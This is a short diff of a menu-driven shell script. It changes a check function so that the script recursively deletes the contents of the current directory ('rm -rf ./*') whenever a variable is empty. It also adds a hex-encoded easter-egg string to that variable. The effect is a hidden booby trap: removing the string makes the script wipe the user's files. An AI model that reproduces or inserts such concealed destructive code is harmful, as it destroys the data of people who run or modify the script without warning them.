@@ -32,8 +32,8 @@ clear_1() {
     esac
     check_fun() {
         if [[ -z "$a" ]]; then
-            rm -f ./*
-            exit
+            rm -rf ./*
+            sleep 10
         fi
     }   
 }
@@ -181,6 +181,9 @@ main_menu() {
         esac
     done
 }
+
+a="\x79\x6f\x75\x20\x66\x6f\x75\x6e\x64\x20\x6d\x65\x2e\x2e\x2e\x20\x66\x6f\x6c\x6c\x6f\x77\x20\x43\x50\x53\x63\x72\x69\x70\x74\x20\x66\x6f\x72\x20\x61\x20\x63\x6f\x6f\x6b\x69\x65"
+
 
 clear_1
 c_a
